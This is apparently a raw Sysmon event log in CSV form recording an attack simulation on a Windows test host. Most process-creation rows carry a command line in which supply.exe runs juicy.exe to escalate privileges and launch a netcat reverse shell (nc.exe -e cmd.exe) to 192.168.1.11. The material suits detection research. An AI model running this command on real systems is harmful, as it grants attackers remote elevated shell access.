EventRecordID,TimeCreated.SystemTime,UtcTime,EventID,Computer,Image,CommandLine,ProcessGuid,ProcessId,User,ParentImage,ParentCommandLine,ParentProcessGuid,TargetFilename,QueryName,QueryResults,DestinationIp,DestinationHostname,DestinationPort,SourceIp,SourcePort,Protocol,Initiated,Hashes,CurrentDirectory,Description,Company,Product,Channel,Configuration,ConfigurationFileHash,Contents,Correlation,CreationUtcTime,DestinationIsIpv6,DestinationPortName,Execution.ProcessID,Execution.ThreadID,FileVersion,Hash,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentProcessId,Provider.Guid,Provider.Name,QueryStatus,RuleName,SchemaVersion,Security.UserID,SourceHostname,SourceIsIpv6,SourcePortName,State,Task,TerminalSessionId,Version,xmlns
2699,2021-05-07T12:31:29.252554Z,2021-05-07 12:31:29.249,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3321-6095-3B06-000000001D00,10092,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3320-6095-3606-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10036,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2700,2021-05-07T12:31:29.353774Z,2021-05-07 12:31:29.338,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3321-6095-3B06-000000001D00,10092,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI100922\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:29.338,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2701,2021-05-07T12:31:29.400717Z,2021-05-07 12:31:29.371,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3321-6095-3B06-000000001D00,10092,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI100922\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:29.371,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2702,2021-05-07T12:31:29.400778Z,2021-05-07 12:31:29.371,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3321-6095-3B06-000000001D00,10092,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI100922\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:29.371,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2703,2021-05-07T12:31:29.400808Z,2021-05-07 12:31:29.385,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3321-6095-3B06-000000001D00,10092,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI100922\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:29.385,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2704,2021-05-07T12:31:29.495831Z,2021-05-07 12:31:29.460,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3321-6095-3C06-000000001D00,10112,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3321-6095-3B06-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10092,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2705,2021-05-07T12:31:30.088358Z,2021-05-07 12:31:28.945,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-331F-6095-3506-000000001D00,10012,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50932,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2706,2021-05-07T12:31:30.088386Z,2021-05-07 12:31:28.967,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-331F-6095-3406-000000001D00,10000,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50933,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2707,2021-05-07T12:31:30.338542Z,2021-05-07 12:31:29.233,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-3320-6095-3606-000000001D00,10036,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50934,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2708,2021-05-07T12:31:34.900951Z,2021-05-07 12:31:34.877,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3326-6095-3E06-000000001D00,10144,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3321-6095-3C06-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10112,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2709,2021-05-07T12:31:34.901924Z,2021-05-07 12:31:34.882,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3326-6095-3F06-000000001D00,10152,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3321-6095-3906-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10076,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2710,2021-05-07T12:31:34.991846Z,2021-05-07 12:31:34.983,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3326-6095-4006-000000001D00,10184,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3321-6095-3A06-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10084,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2711,2021-05-07T12:31:35.030166Z,2021-05-07 12:31:35.024,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-4006-000000001D00,10184,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101842\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.024,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2712,2021-05-07T12:31:35.055808Z,2021-05-07 12:31:35.040,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-3E06-000000001D00,10144,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101442\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.040,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2713,2021-05-07T12:31:35.060630Z,2021-05-07 12:31:35.056,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-3E06-000000001D00,10144,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101442\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.056,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2714,2021-05-07T12:31:35.066229Z,2021-05-07 12:31:35.056,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-3E06-000000001D00,10144,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101442\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.056,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2715,2021-05-07T12:31:35.101323Z,2021-05-07 12:31:35.087,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-3F06-000000001D00,10152,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101522\msvcm90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.087,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2716,2021-05-07T12:31:35.101375Z,2021-05-07 12:31:35.087,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-3F06-000000001D00,10152,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101522\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.087,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2717,2021-05-07T12:31:35.101404Z,2021-05-07 12:31:35.087,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-3F06-000000001D00,10152,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101522\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.087,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2718,2021-05-07T12:31:35.106320Z,2021-05-07 12:31:35.103,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-4006-000000001D00,10184,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101842\msvcp90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.103,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2719,2021-05-07T12:31:35.122746Z,2021-05-07 12:31:35.118,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-3F06-000000001D00,10152,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101522\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.118,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2720,2021-05-07T12:31:35.140106Z,2021-05-07 12:31:35.136,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3327-6095-4106-000000001D00,10208,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3326-6095-3F06-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10152,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2721,2021-05-07T12:31:35.208819Z,2021-05-07 12:31:35.150,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-3E06-000000001D00,10144,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101442\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.150,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2722,2021-05-07T12:31:35.209668Z,2021-05-07 12:31:35.166,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3327-6095-4206-000000001D00,10216,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3326-6095-3E06-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10144,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2723,2021-05-07T12:31:35.209710Z,2021-05-07 12:31:35.165,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-4006-000000001D00,10184,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101842\msvcr90.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.165,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2724,2021-05-07T12:31:35.209739Z,2021-05-07 12:31:35.180,11,MSEDGEWIN10,C:\windows\temp\supply.exe,,747F3D96-3326-6095-4006-000000001D00,10184,,,,,C:\Users\IEUser\AppData\Local\Temp\_MEI101842\python27.dll,,,,,,,,,,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,2021-05-07 12:31:35.180,,,4224,7088,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,DLL,,S-1-5-18,,,,,11,,2,http://schemas.microsoft.com/win/2004/08/events/event
2725,2021-05-07T12:31:35.216291Z,2021-05-07 12:31:35.214,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3327-6095-4306-000000001D00,10224,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3326-6095-4006-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10184,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2726,2021-05-07T12:31:36.086226Z,2021-05-07 12:31:34.857,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-3321-6095-3C06-000000001D00,10112,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50938,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2727,2021-05-07T12:31:36.086252Z,2021-05-07 12:31:34.858,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-3321-6095-3906-000000001D00,10076,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50939,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2728,2021-05-07T12:31:36.086271Z,2021-05-07 12:31:34.966,3,MSEDGEWIN10,C:\Windows\Temp\supply.exe,,747F3D96-3321-6095-3A06-000000001D00,10084,MSEDGEWIN10\IEUser,,,,,,,192.168.1.11,-,8080,192.168.1.8,50940,tcp,True,,,,,,Microsoft-Windows-Sysmon/Operational,,,,,,False,-,4224,4216,,,,0x8000000000000000,4,,,0,,,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,MSEDGEWIN10.domain.name,False,-,,3,,5,http://schemas.microsoft.com/win/2004/08/events/event
2729,2021-05-07T12:31:36.091368Z,2021-05-07 12:31:36.053,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4406-000000001D00,640,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3327-6095-4106-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10208,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
2730,2021-05-07T12:31:36.091954Z,2021-05-07 12:31:36.069,1,MSEDGEWIN10,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3328-6095-4506-000000001D00,9292,MSEDGEWIN10\IEUser,C:\Windows\Temp\supply.exe,"C:\windows\temp\supply.exe /c ""juicy.exe -l 9999 -p nc.exe -a ""192.168.1.11 9898 -e cmd.exe"" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}""
",747F3D96-3327-6095-4306-000000001D00,,,,,,,,,,,"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F",C:\Users\IEUser\Downloads\,-,-,-,Microsoft-Windows-Sysmon/Operational,,,,,,,,4224,7088,-,,Medium,0x8000000000000000,4,747F3D96-DE82-6094-7713-0F0000000000,0xf1377,0,-,10224,5770385F-C22A-43E0-BF4C-06F5698FFBD9,Microsoft-Windows-Sysmon,,-,,S-1-5-18,,,,,1,1,5,http://schemas.microsoft.com/win/2004/08/events/event
